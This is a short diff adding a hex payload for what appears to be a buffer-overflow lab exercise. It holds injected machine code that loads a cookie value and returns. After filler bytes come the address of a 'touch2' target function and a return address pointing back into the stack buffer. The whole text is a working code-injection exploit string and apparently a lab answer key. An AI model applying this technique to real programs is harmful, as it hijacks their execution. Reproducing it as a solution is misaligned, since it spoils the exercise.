@@ -1,0 +1,6 @@
+48 83 ec 10 bf fa 97 b9   /* cbuff_start: exploit_code */
+59 c3 ff ff ff ff ff ff   /* cbuff_8:     exploit_code */
+ff ff ff ff ff ff ff ff   /* cbuff_16:    filler */
+ff ff ff ff ff ff ff ff   /* cbuff_24:    filler */
+ec 17 40 00 00 00 00 00   /* cbuff_end:   touch2_addr */
+78 dc 61 55 00 00 00 00   /* return_addr: cbuff_start */
